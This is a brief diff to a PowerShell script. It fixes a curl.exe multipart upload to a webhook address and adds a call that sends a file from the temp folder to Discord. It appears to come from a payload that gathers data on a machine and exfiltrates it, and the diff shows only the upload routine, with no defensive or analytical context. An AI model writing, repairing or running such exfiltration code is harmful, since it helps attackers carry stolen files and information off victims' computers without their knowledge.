@@ -398,8 +398,10 @@ $Body = @{
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "$env:TMP\$FileName" $hookurl}
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
+
+Upload-Discord -file "$env:TMP\$FileName"
 
 
 ############################################################################################################################################################
